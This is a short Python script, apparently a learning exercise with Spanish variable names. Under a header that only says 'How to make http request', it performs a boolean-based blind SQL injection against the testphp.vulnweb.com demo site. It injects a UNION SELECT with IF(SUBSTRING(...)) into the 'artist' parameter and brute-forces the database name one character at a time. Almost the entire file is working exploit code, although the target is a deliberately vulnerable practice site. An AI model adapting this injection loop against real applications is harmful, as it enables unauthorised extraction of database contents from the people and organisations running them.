# How to make http request
import requests as req
import string

comprobador = "Si esite"

def requestador(letra,busqueda,numero):
    urlCrafteado = "http://testphp.vulnweb.com/artists.php?artist=1 and 1=0 union select 1,IF(SUBSTRING(" + busqueda + ","+ str(numero) + ",1) = \"" + letra + "\", \"Si esite\", \"NO esite\"),3"
    r = req.get(urlCrafteado)
    # print(urlCrafteado)
    return r.text



def ysisi(webpage):

    res = webpage.find(comprobador)

    if res != -1:
        return True
    return False

def main():
    res = ysisi(requestador('b',"database()",1))
    print(res)


def takataka(seleccionador):
    dictionary = string.ascii_lowercase
    dictionary += '1234567890'
    result = ""
    i = 1
    flag = False

    while flag is False:
        for item in dictionary:
            siono = ysisi(requestador(item, seleccionador, i))
            if siono:
                print(str(i)+item + ' ' + str(siono))
                result += item
                i += 1
                break
            if item == '0' and siono is False:
                flag = True
                break

    print(result)


takataka('database()')


# main()
